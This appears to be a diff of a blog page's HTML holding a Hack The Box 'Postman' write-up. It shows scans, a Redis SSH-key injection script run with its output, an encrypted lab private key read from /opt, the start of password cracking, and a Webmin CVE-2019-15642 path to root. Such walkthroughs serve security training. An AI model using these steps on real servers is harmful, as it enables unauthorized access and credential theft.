-</span></span></code></pre></div><p>Root. No intermediate step from Matt to root. Webmin runs as root, the RCE runs as root, that&rsquo;s it. Root flag.</p>
-<p>The credential reuse between the SSH key passphrase and the Webmin login is the connection that makes this box work. It&rsquo;s easy to give up on Webmin after the initial nmap scan when you don&rsquo;t have creds yet. The Redis foothold and the backup key are the nudge to come back and try it. Password reuse on admin panels is extremely common in real environments, which is part of why this pattern shows up so often on HTB.</p>
-
-            </div>
-        </article></main>
-</div>
-
-<script>
-    function toggleToc() {
-        const content = document.getElementById('tocContent');
-        const button = document.querySelector('.toc-toggle');
-        if (!content || !button) return;
-        content.classList.toggle('expanded');
-        button.classList.toggle('expanded');
-    }
-
-    function toggleMiniToc() {
-        const miniToc = document.getElementById('miniToc');
-        if (miniToc) miniToc.classList.toggle('minimized');
-    }
-
-    function setupActiveHighlighting(links) {
-        const targets = Array.from(links).map(link => {
-            const href = link.getAttribute('href');
-            if (href && href.startsWith('#')) {
-                const el = document.getElementById(decodeURIComponent(href.slice(1)));
-                if (el) return { link, element: el };
-            }
-            return null;
-        }).filter(Boolean);
-
-        if (targets.length === 0) return;
-
-        function update() {
-            const scrollPosition = window.scrollY + 100;
-            let active = null;
-            targets.forEach(t => {
-                if (t.element.offsetTop <= scrollPosition) active = t;
-            });
-            links.forEach(l => l.classList.remove('active'));
-            if (active) active.link.classList.add('active');
-        }
-
-        let ticking = false;
-        window.addEventListener('scroll', () => {
-            if (!ticking) {
-                requestAnimationFrame(() => { update(); ticking = false; });
-                ticking = true;
-            }
-        });
-        update();
-    }
-
-    function initMiniToc() {
-        const miniToc = document.getElementById('miniToc');
-        const miniTocContent = document.getElementById('miniTocContent');
-        const sourceToc = document.getElementById('tocContent');
-        if (!miniToc || !miniTocContent || !sourceToc) return;
-
-        const clone = sourceToc.cloneNode(true);
-        clone.classList.remove('toc-content', 'expanded');
-        clone.removeAttribute('id');
-
-        const links = clone.querySelectorAll('a');
-        if (links.length === 0) return;
-
-        links.forEach(link => {
-            link.addEventListener('click', (e) => {
-                const href = link.getAttribute('href');
-                if (href && href.startsWith('#')) {
-                    const target = document.getElementById(decodeURIComponent(href.slice(1)));
-                    if (target) {
-                        e.preventDefault();
-                        target.scrollIntoView({ behavior: 'smooth', block: 'start' });
-                        history.pushState(null, '', href);
-                    }
-                }
-            });
-        });
-
-        miniTocContent.appendChild(clone);
-        miniToc.classList.add('visible');
-        setupActiveHighlighting(links);
-    }
-
-    document.addEventListener('DOMContentLoaded', initMiniToc);
-</script>
-<footer class="footer">
-    <span class="footer_item"> </span>
-    &nbsp;
-
-    <div class="footer_social-icons">
-<a href="https://discord.com/users/kanyo._" target="_blank" rel="noopener noreferrer me"
-    title="Discord"><svg xmlns="http://www.w3.org/2000/svg" viewBox="20 15 205 190" fill="currentColor" stroke="none">
-    <path
-        d="M104.4 103.9c-5.7 0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7 0 10.2-5 10.2-11.1.1-6.1-4.5-11.1-10.2-11.1zM140.9 103.9c-5.7 0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7 0 10.2-5 10.2-11.1s-4.5-11.1-10.2-11.1z" />
-    <path
-        d="M189.5 20h-134C44.2 20 35 29.2 35 40.6v135.2c0 11.4 9.2 20.6 20.5 20.6h113.4l-5.3-18.5 12.8 11.9 12.1 11.2 21.5 19V40.6c0-11.4-9.2-20.6-20.5-20.6zm-38.6 130.6s-3.6-4.3-6.6-8.1c13.1-3.7 18.1-11.9 18.1-11.9-4.1 2.7-8 4.6-11.5 5.9-5 2.1-9.8 3.5-14.5 4.3-9.6 1.8-18.4 1.3-25.9-.1-5.7-1.1-10.6-2.7-14.7-4.3-2.3-.9-4.8-2-7.3-3.4-.3-.2-.6-.3-.9-.5-.2-.1-.3-.2-.4-.3-1.8-1-2.8-1.7-2.8-1.7s4.8 8 17.5 11.8c-3 3.8-6.7 8.3-6.7 8.3-22.1-.7-30.5-15.2-30.5-15.2 0-32.2 14.4-58.3 14.4-58.3 14.4-10.8 28.1-10.5 28.1-10.5l1 1.2c-18 5.2-26.3 13.1-26.3 13.1s2.2-1.2 5.9-2.9c10.7-4.7 19.2-6 22.7-6.3.6-.1 1.1-.2 1.7-.2 6.1-.8 13-1 20.2-.2 9.5 1.1 19.7 3.9 30.1 9.6 0 0-7.9-7.5-24.9-12.7l1.4-1.6s13.7-.3 28.1 10.5c0 0 14.4 26.1 14.4 58.3 0 0-8.5 14.5-30.6 15.2z" />
-</svg></a>
-<a href="https://github.com/Chaelsoo" target="_blank" rel="noopener noreferrer me"
-    title="Github"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
-    stroke-linecap="round" stroke-linejoin="round">
-    <path
-        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
-    </path>
-</svg></a>
-<a href="https://www.linkedin.com/in/abderrahmen-dellaa-a78517249/" target="_blank" rel="noopener noreferrer me"
-    title="Linkedin"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
-    stroke-linecap="round" stroke-linejoin="round">
-    <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path>
-    <rect x="2" y="9" width="4" height="12"></rect>
-    <circle cx="4" cy="4" r="2"></circle>
-</svg></a>
-<a href="https://app.hackthebox.com/users/1490281" target="_blank" rel="noopener noreferrer me"
-    title="Hackthebox"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M12 1L2 6.5v11L12 23l10-5.5v-11L12 1z"></path><path d="M12 12L2 6.5M12 12v11M12 12l10-5.5"></path></svg></a>
-</div>
-    <small class="footer_copyright">
-        © 2026 .
-        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noopener">Hugo blog awesome</a>.
-    </small>
-</footer><a href="#" title="Go to top" id="totop">
-    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
-    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
-</svg>
-
-</a>
-
-
-    
-
-
-
-
-    
-
-
-
-
-    
-
-
-
-
-
-
-    
-    <script async src="http://localhost:1313/js/main.js"></script>
-
-    
-
-</body>
-</html>
+<!doctype html><html lang=en-gb><head><meta charset=utf-8><meta http-equiv=content-type content="text/html"><meta name=viewport content="width=device-width,initial-scale=1"><title itemprop=name>HTB: Postman | kanyo's blog</title><meta property="og:title" content="HTB: Postman | kanyo's blog"><meta name=twitter:title content="HTB: Postman | kanyo's blog"><meta itemprop=name content="HTB: Postman | kanyo's blog"><meta name=application-name content="HTB: Postman | kanyo's blog"><meta property="og:site_name" content><meta name=description content="An Easy Linux box where unauthenticated Redis lets you inject an SSH key for a foothold. A cracked SSH key backup from /opt turns out to be Matt's Webmin password, and CVE-2019-15642 on Webmin 1.910 turns that authenticated session into a root shell."><meta itemprop=description content="An Easy Linux box where unauthenticated Redis lets you inject an SSH key for a foothold. A cracked SSH key backup from /opt turns out to be Matt's Webmin password, and CVE-2019-15642 on Webmin 1.910 turns that authenticated session into a root shell."><meta property="og:description" content="An Easy Linux box where unauthenticated Redis lets you inject an SSH key for a foothold. A cracked SSH key backup from /opt turns out to be Matt's Webmin password, and CVE-2019-15642 on Webmin 1.910 turns that authenticated session into a root shell."><meta name=twitter:description content="An Easy Linux box where unauthenticated Redis lets you inject an SSH key for a foothold. A cracked SSH key backup from /opt turns out to be Matt's Webmin password, and CVE-2019-15642 on Webmin 1.910 turns that authenticated session into a root shell."><meta property="og:locale" content="en-gb"><meta name=language content="en-gb"><link rel=alternate hreflang=en-gb href=https://chaelsoo.me/writeups/htb-postman/ title=English><meta name=generator content="Hugo 0.161.1"><meta property="og:url" content="https://chaelsoo.me/writeups/htb-postman/"><meta property="og:site_name" content="kanyo's blog"><meta property="og:title" content="HTB: Postman"><meta property="og:description" content="An Easy Linux box where unauthenticated Redis lets you inject an SSH key for a foothold. A cracked SSH key backup from /opt turns out to be Matt's Webmin password, and CVE-2019-15642 on Webmin 1.910 turns that authenticated session into a root shell."><meta property="og:locale" content="en_gb"><meta property="og:type" content="article"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2026-06-08T00:00:00+00:00"><meta property="article:modified_time" content="2026-06-08T00:00:00+00:00"><meta property="article:tag" content="Webmin"><meta property="article:tag" content="Redis"><meta property="article:tag" content="Linux"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB: Postman"><meta name=twitter:description content="An Easy Linux box where unauthenticated Redis lets you inject an SSH key for a foothold. A cracked SSH key backup from /opt turns out to be Matt's Webmin password, and CVE-2019-15642 on Webmin 1.910 turns that authenticated session into a root shell."><link rel=canonical href=https://chaelsoo.me/writeups/htb-postman/><link href=/style.min.2dc4fd9484cccdeb4e540eaff87cc3f2c37bacb70d134bbaec04ff76525358fc.css rel=stylesheet><link href=/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css rel=stylesheet><link rel=apple-touch-icon sizes=180x180 href=/icons/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/icons/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/icons/favicon-16x16.png><link rel=mask-icon href=/icons/safari-pinned-tab.svg><link rel="shortcut icon" href=/favicon.ico><link rel=manifest href=https://chaelsoo.me/site.webmanifest><meta name=msapplication-config content="/browserconfig.xml"><meta name=msapplication-TileColor content="#2d89ef"><meta name=theme-color content="#434648"></head><body data-theme=dark class=notransition><script src=/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script><div class=navbar role=navigation><nav class=menu aria-label="Main Navigation"><a href=https://chaelsoo.me/ class=logo><svg width="25" height="25" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-home"><title>Home</title><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
+</a><input type=checkbox id=menu-trigger class=menu-trigger>
+<label for=menu-trigger><span class=menu-icon><svg width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7H3.40726"/><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488H3.49301"/><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"/><path stroke-linecap="round" stroke-linejoin="round" d="M.5 12.5V1.5c0-.552285.447715-1 1-1h11C13.0523.5 13.5.947715 13.5 1.5v11C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C.947715 13.5.5 13.0523.5 12.5z"/></svg></span></label><div class=trigger><ul class=trigger-container><li><a class=menu-link href=/>Home</a></li><li><a class=menu-link href=/blogs/>Blogs</a></li><li><a class="menu-link active" href=/writeups/>Writeups</a></li><li><a class=menu-link href=/about/>About</a></li><li><a class=menu-link href=https://notes.chaelsoo.me>Cheatsheet</a></li><li class=menu-separator><span>|</span></li></ul><a id=mode href=#><svg class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1"><title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1=".5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1=".5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/></g></svg>
+<svg class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1"><title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1=".5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1=".5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/></g></svg></a></div></nav></div><div class="wrapper post"><main class=page-content aria-label=Content><article><header class=header><h1 class=header-title>HTB: Postman</h1><div class=post-meta><time datetime=2026-06-08T00:00:00+00:00 itemprop=datePublished>8 Jun 2026</time></div></header><img src=/images/writeups/htb-postman/htb-postman-pwned.png alt="HTB: Postman" style="width:100%;border-radius:.5rem;margin:1.5rem 0"><div class=toc-container><button class=toc-toggle type=button onclick=toggleToc()>Table of Contents</button><div class=toc-content id=tocContent><nav id=TableOfContents><ul><li><a href=#recon>Recon</a></li><li><a href=#redis-ssh-key-injection>Redis SSH Key Injection</a></li><li><a href=#from-redis-to-matt>From redis to Matt</a></li><li><a href=#cve-2019-15642-webmin-rce>CVE-2019-15642: Webmin RCE</a></li></ul></nav></div></div><div class=mini-toc id=miniToc><div class=mini-toc-header><div class=mini-toc-title>Contents</div><button class=mini-toc-minimize type=button onclick=toggleMiniToc() aria-label="Minimize TOC">
+<svg fill="currentColor" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M1 8a.5.5.0 01.5-.5h13a.5.5.0 010 1h-13A.5.5.0 011 8zM7.646 4.146a.5.5.0 01.708.0l2 2a.5.5.0 01-.708.708L8.5 5.707V11.5a.5.5.0 01-1 0V5.707L6.354 6.854a.5.5.0 11-.708-.708l2-2z"/></svg></button></div><div class=mini-toc-content id=miniTocContent></div></div><div class=page-content><p>An Easy box that teaches two separate lessons: unauthenticated Redis is a direct shell primitive, and version numbers on admin panels are worth looking up before you give up and move on. The initial nmap scan shows a Webmin instance on port 10000, but it needs credentials. Easy to dismiss and come back to. The full port scan reveals Redis on 6379, no auth, which hands you a foothold as the redis user. From there a backup SSH key in <code>/opt</code> cracks quickly, and that password ends up being exactly what Matt uses to log into Webmin. CVE-2019-15642 on that Webmin version is an authenticated RCE that shells out as root.</p><h2 id=recon>Recon</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>…/labs/postman ❯ sudo nmap -sV -sC -T4 <span class=nv>$DC</span>
+</span></span><span class=line><span class=cl>Starting Nmap 7.99 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2026-06-08 19:05 +0100
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.18.102
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.13s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>Not shown: <span class=m>997</span> closed tcp ports <span class=o>(</span>reset<span class=o>)</span>
+</span></span><span class=line><span class=cl>PORT      STATE SERVICE VERSION
+</span></span><span class=line><span class=cl>22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>2048</span> 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 <span class=o>(</span>RSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 <span class=o>(</span>ECDSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 <span class=o>(</span>ED25519<span class=o>)</span>
+</span></span><span class=line><span class=cl>80/tcp    open  http    Apache httpd 2.4.29 <span class=o>((</span>Ubuntu<span class=o>))</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: The Cyber Geek<span class=err>&#39;</span>s Personal Website
+</span></span><span class=line><span class=cl>10000/tcp open  http    MiniServ 1.910 <span class=o>(</span>Webmin httpd<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: MiniServ/1.910
+</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p>Three ports. Webmin <code>1.910</code> is an old version. The first thing I looked up was CVE-2019-15642, an authenticated RCE that returns a shell as root. But it needs credentials, so it&rsquo;s a privesc primitive waiting to be used, not an entry point.</p><p><em>Reference: <a href=https://github.com/jas502n/CVE-2019-15642>github.com/jas502n/CVE-2019-15642</a></em></p><p>Port 80 is a static personal page with nothing actionable. Subdomain fuzzing found nothing. The initial scan only shows three ports, so I ran a full port scan while I enumerated what was already visible:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>…/labs/postman ✗ sudo nmap -sV -sC -T4 -p- <span class=nv>$DC</span>
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> postman.htb <span class=o>(</span>10.129.18.102<span class=o>)</span>
+</span></span><span class=line><span class=cl>NOT shown: <span class=m>65531</span> closed tcp ports <span class=o>(</span>reset<span class=o>)</span>
+</span></span><span class=line><span class=cl>PORT      STATE SERVICE VERSION
+</span></span><span class=line><span class=cl>22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>2048</span> 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 <span class=o>(</span>RSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 <span class=o>(</span>ECDSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 <span class=o>(</span>ED25519<span class=o>)</span>
+</span></span><span class=line><span class=cl>80/tcp    open  http    Apache httpd 2.4.29 <span class=o>((</span>Ubuntu<span class=o>))</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: The Cyber Geek<span class=err>&#39;</span>s Personal Website
+</span></span><span class=line><span class=cl>6379/tcp  open  redis   Redis key-value store 4.0.9
+</span></span><span class=line><span class=cl>10000/tcp open  http    MiniServ 1.910 <span class=o>(</span>Webmin httpd<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: MiniServ/1.910
+</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p>Redis on <code>6379</code>. Version <code>4.0.9</code>, and on HTB boxes Redis this old is almost always unauthenticated.</p><h2 id=redis-ssh-key-injection>Redis SSH Key Injection</h2><p>Redis is an in-memory key-value store. When it&rsquo;s misconfigured without authentication, it exposes two commands that together enable arbitrary file writes anywhere the redis process has write permissions: <code>CONFIG SET dir</code> changes the directory where Redis saves its dump file, and <code>CONFIG SET dbfilename</code> sets the dump file&rsquo;s name. If you set those to point to a user&rsquo;s <code>.ssh/</code> directory and stage a key as a Redis value, saving the database writes your public key into <code>authorized_keys</code>.</p><p>The redis service account on Linux typically has a home directory at <code>/var/lib/redis</code>. That directory usually contains a <code>.ssh/</code> folder. With unauthenticated access, this is a direct foothold.</p><p><em>Reference: <a href=https://github.com/cancela24/Redis-Exploit-Misconfigured-Redis-Server-to-Inject-SSH-Keys>github.com/cancela24/Redis-Exploit-Misconfigured-Redis-Server-to-Inject-SSH-Keys</a></em></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Redis-Exploit-Misconfigured-Redis-Server-to-Inject-SSH-Keys main ✗ python3 poc.py 10.129.18.102 
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Starting Redis exploitation...
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Generating SSH key pair...
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> SSH key pair generated successfully.
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Connecting to Redis server at 10.129.18.102...
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Flushing all keys from Redis...
+</span></span><span class=line><span class=cl>OK
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Uploading public SSH key to Redis...
+</span></span><span class=line><span class=cl>OK
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Configuring Redis to save keys to /var/lib/redis/.ssh/...
+</span></span><span class=line><span class=cl>OK
+</span></span><span class=line><span class=cl>OK
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Saving the key to disk on the Redis server...
+</span></span><span class=line><span class=cl>OK
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Public SSH key injected successfully into /var/lib/redis/.ssh/authorized_keys.
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> PoC completed. You can manually connect to the server using your private key. ssh -i id_rsa redis@&lt;ip_address&gt;
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>…/labs/postman ❯ ssh -i id_rsa redis@10.129.18.102
+</span></span><span class=line><span class=cl>Welcome to Ubuntu 18.04.3 LTS <span class=o>(</span>GNU/Linux 4.15.0-58-generic x86_64<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>redis@Postman:~$ ls
+</span></span></code></pre></div><p>Shell as redis.</p><h2 id=from-redis-to-matt>From redis to Matt</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>redis@Postman:/var/www$ whoami
+</span></span><span class=line><span class=cl>redis
+</span></span><span class=line><span class=cl>redis@Postman:/var/www$ id
+</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>107<span class=o>(</span>redis<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>114<span class=o>(</span>redis<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>114<span class=o>(</span>redis<span class=o>)</span>
+</span></span><span class=line><span class=cl>redis@Postman:/var/www$ ls /home
+</span></span><span class=line><span class=cl>Matt
+</span></span></code></pre></div><p>One user: Matt. Webmin was confirmed running as root:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root        <span class=m>769</span>  0.0  3.1  <span class=m>95204</span> <span class=m>29336</span> ?        Ss   19:04   0:00 /usr/bin/perl /usr/share/webmin/miniserv.pl /etc/webmin/miniserv.conf
+</span></span></code></pre></div><p>Checking common places for interesting files, <code>/opt</code> had something:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>redis@Postman:/$ ls /opt/
+</span></span><span class=line><span class=cl>id_rsa.bak
+</span></span><span class=line><span class=cl>redis@Postman:/$ cat /opt/id_rsa.bak 
+</span></span><span class=line><span class=cl>-----BEGIN RSA PRIVATE KEY-----
+</span></span><span class=line><span class=cl>Proc-Type: 4,ENCRYPTED
+</span></span><span class=line><span class=cl>DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
+</span></span><span class=line><span class=cl>cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
+</span></span><span class=line><span class=cl>7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
+</span></span><span class=line><span class=cl>cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
+</span></span><span class=line><span class=cl>1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
+</span></span><span class=line><span class=cl>EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
+</span></span><span class=line><span class=cl>UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
+</span></span><span class=line><span class=cl>Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
+</span></span><span class=line><span class=cl>t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
+</span></span><span class=line><span class=cl>5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
+</span></span><span class=line><span class=cl>P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
+</span></span><span class=line><span class=cl>jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
+</span></span><span class=line><span class=cl>SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
+</span></span><span class=line><span class=cl>l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
+</span></span><span class=line><span class=cl>0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
+</span></span><span class=line><span class=cl>S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
+</span></span><span class=line><span class=cl>hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
+</span></span><span class=line><span class=cl>Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
+</span></span><span class=line><span class=cl>XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
+</span></span><span class=line><span class=cl>b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
+</span></span><span class=line><span class=cl>WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
+</span></span><span class=line><span class=cl>KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
+</span></span><span class=line><span class=cl>npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
+</span></span><span class=line><span class=cl>VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
+</span></span><span class=line><span class=cl>X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw<span class=o>==</span>
+</span></span><span class=line><span class=cl>-----END RSA PRIVATE KEY-----
+</span></span></code></pre></div><p>An encrypted RSA private key backup. <code>Proc-Type: 4,ENCRYPTED</code> means there&rsquo;s a passphrase. <code>ssh2john</code> extracts a crackable hash, and john cracks it:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>…/labs/postman ✗ john matt.hash --wordlist<span class=o>=</span>/home/kanyo/tools/wordlists/rockyou.txt
